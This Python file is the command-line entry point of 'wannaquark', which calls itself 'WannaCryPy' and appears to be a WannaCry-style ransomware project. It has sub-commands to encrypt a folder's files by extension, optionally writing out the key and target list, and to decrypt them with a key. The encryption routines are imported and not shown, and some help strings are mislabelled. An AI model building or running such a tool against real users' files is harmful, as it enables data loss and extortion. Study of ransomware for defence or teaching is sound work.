# coding=utf-8

import argparse
import sys

from wannaquark.utils.constants import Constants
from wannaquark.app import run_encryption, run_decryption
from wannaquark.utils.log_config import init_logging

init_logging()


def main():
    parser = argparse.ArgumentParser(prog='python -m '+Constants.PACKAGE_NAME, description="WannaCryPy")
    subparsers = parser.add_subparsers(dest='cmd', help='sub-command help', title="cmd")
    subparsers.required = True

    ################### Encryption ###################
    parser_a1 = subparsers.add_parser('encrypt', help='Encrypt content of the folder')
    parser_a1.add_argument("target", help="Path to the target dir", type=str)
    parser_a1.add_argument("-e", "--extension",
                           help="All extensions to encrypt separated by comma i.e. '.txt,.png,.jpg'", type=str)
    parser_a1.add_argument("-t", "--write_targets", help="Generate file listing all targets", action='store_true')
    parser_a1.add_argument("-k", "--write_key", help="Generate file listing all targets", action='store_true')
    parser_a1.add_argument("-d", "--decrypt", help="Generate file listing all targets", action='store_true')

    ################### Decryption ###################
    parser_a2 = subparsers.add_parser('decrypt', help='Decrypt content of the folder')
    parser_a2.add_argument("target", help="Path to the target dir", type=str)
    parser_a2.add_argument("key", help="Input the key", type=str)

    try:
        args = parser.parse_args()
    except:
        # Print help
        parser.print_help()
        sys.exit(0)

    if args.cmd == 'encrypt':
        run_encryption(args)

    if args.cmd == 'decrypt':
        run_decryption(args)


if __name__ == "__main__":
    main()



















